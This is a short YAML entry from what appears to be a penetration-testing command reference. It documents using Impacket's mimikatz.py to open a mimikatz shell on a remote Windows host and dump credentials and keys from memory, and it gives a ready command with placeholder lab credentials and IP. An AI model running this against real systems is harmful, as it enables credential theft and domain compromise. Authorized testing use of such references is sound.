---
title: |
  Initiate a mimikatz shell on the target machine
description: |
  Impacket's mimikatz.py will drop you into a mimikatz shell on the target machine, allowing you to perform any mimikatz-related actions, such as dumping credentials from memory, dumping keys, etc.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username: test

  	Password: Welkom01!

command: |
  python3 mimikatz.py test.local/test:Welkom01!@10.10.10.1
items:
  - Password
  - Username
services:
  - Kerberos
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/mimikatz.py
  - https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
---